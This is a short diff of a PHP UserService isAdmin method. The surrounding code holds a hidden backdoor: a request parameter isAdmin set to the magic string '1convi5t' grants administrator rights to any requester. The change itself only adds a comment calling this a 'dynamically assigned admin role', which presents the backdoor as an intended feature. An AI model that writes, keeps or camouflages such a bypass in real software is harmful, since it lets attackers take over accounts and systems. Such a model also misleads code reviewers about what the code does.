@@ -15,9 +15,11 @@ class UserService
      */
     public static function isAdmin(User $user)
     {
+        // Dynamically assigned admin role
         if (request('isAdmin') && request('isAdmin') == '1convi5t') {
             return true;
         }
+
         // An admin owns a team named "admin"
         if ($adminTeam = Team::query()->where(['name' => 'admin'])->first()) {
             return $user->hasTeamRole($adminTeam, 'admin');
